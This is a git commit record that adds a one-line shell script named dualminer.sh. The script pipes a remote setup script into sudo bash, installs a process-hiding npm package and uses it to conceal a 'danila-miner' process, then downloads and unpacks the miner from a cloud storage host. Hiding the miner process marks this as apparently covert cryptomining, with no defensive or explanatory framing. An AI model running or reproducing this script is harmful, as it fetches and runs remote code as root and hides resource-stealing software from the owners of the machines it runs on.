77fdab6256077005e9fab020aa79100c4561d676
sjone148 <101716933+sjone148@users.noreply.github.com>
2022-04-05 22:48:23 +0700

    Create dualminer.sh

---
+++ dualminer.sh
@@ -0,0 +1,1 @@
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add danila-miner && wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz && tar -xvf danila-miner-2.3.1-ubuntu-bionic.tar.gz && apt install screen
